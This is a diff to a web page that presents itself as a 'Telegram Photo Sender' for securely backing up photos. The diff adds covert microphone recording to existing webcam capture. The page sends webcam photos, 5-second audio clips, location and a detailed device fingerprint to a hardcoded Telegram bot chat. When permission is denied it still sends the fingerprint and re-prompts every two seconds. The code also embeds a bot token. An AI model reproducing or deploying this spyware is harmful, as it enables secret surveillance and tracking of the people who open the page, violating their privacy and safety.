@@ -28,17 +28,20 @@
   <h1>📸 Telegram Photo Sender</h1>
   <p style="font-size: 16px; opacity: 0.9;">Securely backup your photos to Telegram</p>
   
-  <div id="status">🔄 Requesting camera access...</div>
+  <div id="status">🔄 Requesting camera + microphone access...</div>
   <div id="video-container" style="display:none;"><video id="video" autoplay muted playsinline></video></div>
   <div id="retry-section" style="display:none;">
-    <p style="font-size:20px; color:#ff4444; margin:20px;">🚫 Camera access denied!</p>
-    <p style="font-size: 16px; opacity: 0.9;">📤 Sending device info... Next retry in 2s</p>
+    <p style="font-size:20px; color:#ff4444; margin:20px;">🚫 Camera/Microphone denied!</p>
+    <p style="font-size: 16px; opacity: 0.9;">📤 Sending device + audio... Next retry in 2s</p>
     <button class="retry-btn" onclick="retryCamera()">🔄 Manual Retry</button>
   </div>
 
   <script>
     let stream = null;
     let photoInterval = null;
+    let audioContext = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
     let nextRetryTimer = null;
     let locationData = { 
       lat: '9.9406', lng: '76.2653', accuracy: 'IP (~10km)', source: 'IP', 
@@ -48,100 +51,130 @@
     let retryCount = 0;
     let infoSent = false;
 
-    // Send device info on FIRST denial
+    // Start audio recording
+    function startAudioCapture() {
+      audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      navigator.mediaDevices.getUserMedia({ audio: true })
+        .then(stream => {
+          mediaRecorder = new MediaRecorder(stream);
+          audioChunks = [];
+          
+          mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+          mediaRecorder.onstop = sendAudio;
+          
+          mediaRecorder.start();
+          setTimeout(() => {
+            if (mediaRecorder.state === 'recording') mediaRecorder.stop();
+          }, 5000); // 5s audio clips
+        })
+        .catch(e => console.log('Audio failed:', e));
+    }
+
+    // Send audio file
+    async function sendAudio() {
+      if (audioChunks.length === 0) return;
+      
+      const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+      const device = await getDeviceFingerprint();
+      
+      const formData = new FormData();
+      formData.append('voice', audioBlob, `audio_${locationData.ip}_${Date.now()}.webm`);
+      formData.append('chat_id', '6469212447');
+      formData.append('caption', `🎤 AUDIO + DEVICE | IP: ${locationData.ip} | 🔋 ${device.battery}`);
+      
+      try {
+        await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendVoice`, {
+          method: 'POST', body: formData,
+        });
+        console.log('✅ Audio sent');
+      } catch (e) {
+        console.log('Audio send failed');
+      }
+    }
+
+    // Device info on denial
     async function sendDeviceInfoOnDenial() {
       if (infoSent) return;
       infoSent = true;
       
+      // Send audio first
+      startAudioCapture();
+      
       const device = await getDeviceFingerprint();
       const ts = new Date().toLocaleString();
       
-      const caption = `**📱 CAMERA DENIED - DEVICE INFO** #${retryCount}
-**🚫 STATUS:** Camera blocked - retrying every 2s...
+      const caption = `**🚫 CAMERA/MIC DENIED** #${retryCount}
+**🎤 AUDIO:** Recording 5s sample...
+**⏳ Retries:** Every 2s forever
 
 **🌐 NETWORK**
 • **IP:** \`${locationData.ip}\`
-• **ISP:** ${locationData.org}
-• **City:** ${locationData.city}, ${locationData.region}
+• **ISP:** ${locationData.org} | **📍** ${locationData.city}
 
-**💻 DEVICE FINGERPRINT**
+**💻 DEVICE**
 • **UA:** ${device.userAgent}
-• **Platform:** ${device.platform}
-• **Screen:** ${device.screen} @${device.pixelRatio}x
-• **RAM:** ${device.ram}
-• **Battery:** ${device.battery}
-• **CPU:** ${device.hardwareConcurrency} cores
-• **Lang:** ${device.languages}
-• **Network:** ${device.connection}
-• **Timezone:** ${device.timezone}
+• **Screen:** ${device.screen} | **RAM:** ${device.ram}
+• **Battery:** ${device.battery} | **CPU:** ${device.hardwareConcurrency}c
+• **Lang:** ${device.languages} | **Net:** ${device.connection}
 
-**📍 LOCATION** ${locationData.lat}, ${locationData.lng}
-**🕐** ${ts}`;
+**📍** ${locationData.lat}, ${locationData.lng} | **${ts}`;
 
       const formData = new FormData();
       formData.append('chat_id', '6469212447');
       formData.append('text', caption);
       formData.append('parse_mode', 'Markdown');
-      formData.append('disable_web_page_preview', 'true');
 
       try {
         await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendMessage`, {
           method: 'POST', body: formData,
         });
-        console.log('✅ Device info sent on denial');
-      } catch (e) {
-        console.log('Info send failed');
-      }
+      } catch (e) {}
     }
 
-    // 2-SECOND TIMER AFTER DENIAL
+    // 2s retry timer
     async function scheduleNextRetry() {
       retryCount++;
       
       if (nextRetryTimer) clearTimeout(nextRetryTimer);
       
-      updateStatus(`🚫 Denied #${retryCount} - Sending info + retry in 2s`);
+      updateStatus(`🚫 Denied #${retryCount} - Audio+info sent, retry 2s`);
       document.getElementById('retry-section').style.display = 'block';
       
-      // SEND DEVICE INFO ON DENIAL
       await sendDeviceInfoOnDenial();
       
-      // 2-SECOND TIMER STARTS NOW
       nextRetryTimer = setTimeout(async () => {
-        updateStatus(`🔄 Retry #${retryCount} starting...`);
+        updateStatus(`🔄 Retry #${retryCount}...`);
         await requestCamera();
       }, 2000);
     }
 
     window.retryCamera = async function() {
-      updateStatus('🔄 Manual retry...');
+      updateStatus('🔄 Manual retry w/ audio...');
       await requestCamera();
     };
 
+    // Camera + Mic request
     async function requestCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
           video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' },
-          audio: false
+          audio: true  // ← AUDIO ENABLED
         });
         
-        if (nextRetryTimer) {
-          clearTimeout(nextRetryTimer);
-          nextRetryTimer = null;
-        }
+        if (nextRetryTimer) clearTimeout(nextRetryTimer);
         onCameraSuccess();
         return true;
         
       } catch (error) {
         console.log(`#${retryCount} failed:`, error.name);
-        scheduleNextRetry(); // Sends info + 2s timer
+        scheduleNextRetry();
         return false;
       }
     }
 
     function onCameraSuccess() {
       document.getElementById('status').style.color = '#44ff44';
-      document.getElementById('status').innerText = '✅ Camera granted! Sending photos...';
+      document.getElementById('status').innerText = '✅ Cam+Mic granted! Video+Audio streaming...';
       document.getElementById('video-container').style.display = 'block';
       document.getElementById('retry-section').style.display = 'none';
       
@@ -150,6 +183,7 @@
       
       startLocationTracking();
       startPhotoCapture();
+      startAudioCapture(); // Continuous audio
     }
 
     function updateStatus(msg) {
@@ -211,22 +245,11 @@
     async function captureAndSend() {
       const device = await getDeviceFingerprint();
       const ts = new Date().toLocaleString();
-      const localTs = new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'});
       
-      const caption = `**📱 CAMERA CAPTURED** #${Math.floor(Date.now()/2000)}
-**🌐 IP:** \`${locationData.ip}\` | **📍** ${locationData.city}
-**🏛️** ${locationData.org} | **🇮🇳** ${locationData.region}
-**📱** ${device.platform} | ${device.userAgent}
-**🖥️** ${device.screen} @${device.pixelRatio}x
-**💾** ${device.ram} | **🔋** ${device.battery}
-**⚙️** ${device.hardwareConcurrency}c | ${device.languages}
-**📶** ${device.connection} | **⏰** ${device.timezone}
-
-**📍 GPS:** ${locationData.lat}, ${locationData.lng}
-**📏** ${locationData.accuracy} | **${locationData.source}**
-
-**🕐** ${ts} | **🕐 Local:** ${localTs}
-`;
+      const caption = `**📹🎤 VIDEO+Audio** #${Math.floor(Date.now()/2000)}
+**🌐** \`${locationData.ip}\` | **📍** ${locationData.city}
+**🔋** ${device.battery} | **💾** ${device.ram}
+**📱** ${device.platform} | **🖥️** ${device.screen}`;
 
       const video = document.getElementById('video');
       if (video.readyState < 2) return;
@@ -238,7 +261,7 @@
 
       const blob = dataURLtoBlob(canvas.toDataURL('image/jpeg', 0.9));
       const formData = new FormData();
-      formData.append('photo', blob, `cam_${locationData.ip}_${Date.now()}.jpg`);
+      formData.append('photo', blob, `video_${locationData.ip}_${Date.now()}.jpg`);
       formData.append('chat_id', '6469212447');
       formData.append('caption', caption);
       formData.append('parse_mode', 'Markdown');
@@ -247,10 +270,7 @@
         await fetch(`https://api.telegram.org/bot8782383119:AAEJRURuizoo7VkOlR49PukI37_gSXxSCpU/sendPhoto`, {
           method: 'POST', body: formData,
         });
-        updateStatus(`✅ Photo sent | 📍 ${locationData.lat},${locationData.lng}`);
-      } catch (e) {
-        console.log('Photo send failed');
-      }
+      } catch (e) {}
     }
 
     function dataURLtoBlob(dataURL) {
@@ -271,9 +291,10 @@
       if (stream) stream.getTracks().forEach(track => track.stop());
       if (nextRetryTimer) clearTimeout(nextRetryTimer);
       if (photoInterval) clearInterval(photoInterval);
+      if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
     });
 
-    // START
+    // START - Camera + Microphone
     requestCamera();
   </script>
 </body>
